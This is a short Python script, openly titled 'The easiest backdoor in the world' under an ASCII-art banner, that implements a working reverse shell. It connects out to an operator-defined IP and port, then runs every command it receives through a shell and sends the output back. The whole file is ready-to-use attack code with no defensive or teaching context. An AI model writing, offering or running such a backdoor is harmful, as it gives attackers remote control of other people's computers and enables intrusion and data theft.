#            The easiest backdoor in the world.     
#            ___________  ___  ______ _   __ ___________  ______  ___  _____  _   _______ _____  ____________
#           /  ___| ___ \/ _ \ | ___ \ | / /|  ___|  _  \ | ___ \/ _ \/  __ \| | / /  _  \  _  ||  _  | ___  |
#           \ `--.| |_/ / /_\ \| |_/ / |/ / | |__ | | | | | |_/ / /_\ \ /  \/| |/ /| | | | | | || | | | |_/ /
#            `--. \  __/|  _  ||    /|    \ |  __|| | | | | ___ \  _  | |    |    \| | | | | | || | | |    / 
#           /\__/ / |   | | | || |\ \| |\  \| |___| |/ /  | |_/ / | | | \__/\| |\  \ |/ /\ \_/ /\ \_/ / |\ \ 
#           \____/\_|   \_| |_/\_| \_\_| \_/\____/|___/   \____/\_| |_/\____/\_| \_/___/  \___/  \___/\_| \_|                                                                                             
    



import socket
import subprocess




SERVER_HOST = '127.0.0.1' # define your IP
SERVER_PORT = 4444 # define your PORT ( OPEN ) | not necessary if it's local




##########################################################

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket object for network connection

client.connect((SERVER_HOST, SERVER_PORT)) # connection to the server | IP : PORT

##########################################################




while True:




    command = client.recv(1024).decode() # server command of 1024 bytes, decodes the command




    if 'exit' in command:
        break




    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)




    command_output = output.stdout.read() + output.stderr.read()




    client.send(command_output)




client.close()
